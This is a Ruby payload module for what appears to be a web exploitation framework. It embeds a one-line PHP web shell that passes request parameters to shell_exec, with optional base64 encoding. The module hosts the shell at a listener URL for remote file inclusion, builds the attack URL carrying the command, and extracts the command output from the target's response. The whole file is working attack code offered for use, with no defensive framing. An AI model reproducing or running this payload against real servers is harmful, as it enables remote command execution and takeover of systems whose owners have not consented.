require 'base64'

class WebXploit <  WXf::WXfmod_Factory::Payload
  
  include WXf::WXfassists::Payload::RFI

  def initialize
        super( 
    'Name'        => 'Payload for simplistic, one line PHP based command execution',
    'Version'     => '1.0',
    'Description' => %q{
      stuff                       },
    'References'  =>
     [
        [ 'URL', 'http://example.com/' ]
       
     ],
    'Author'      => [ 'CKTRICKY' ],
    'License'     => WXF_LICENSE
)
     init_opts([
        OptString.new('CMD', [true, "Description of this option", "pwd"]),
        OptString.new('LURL', [true, "This is the URL of the system hosting the ", "http://127.0.0.1:8888"]),
        OptBool.new('ENCODE', [false, "If false, we won't encode/decode in Base64", false])
      ])
      
  end

  def php_exec
  %q{ <? if($_REQUEST[e]==T){$c=base64_decode($_REQUEST['c']);}else{$c=$_REQUEST['c'];}$r=shell_exec($c);if($_REQUEST[e]==T){$o=base64_encode($r);}else{$o=$r;}print"<!--<#>$o<%>-->\n";?> }
  end
  
  def payload_data   
    lurl = datahash['LURL']
    webserver_init_lhtml(php_exec,lurl )
    cmd = datahash['CMD']
    encode = datahash['ENCODE'] 
    str = encode == true ? Base64.encode64(cmd) : cmd 
    encode_bool = encode == true ? "T" : ""    
    return "#{lurl}&c=#{str}&e=#{encode_bool}"
  end
  
  def payload_extraction(data)
    extract_data = data.to_s.match(/<!--<#>(.*)<%>-->/m) 
    if extract_data.kind_of?(MatchData) 
      prnt_plus(extract_data[1])
    else
      prnt_err("Exploit unsuccessful")   
    end
  end 
            
          
      
          
          
    
end
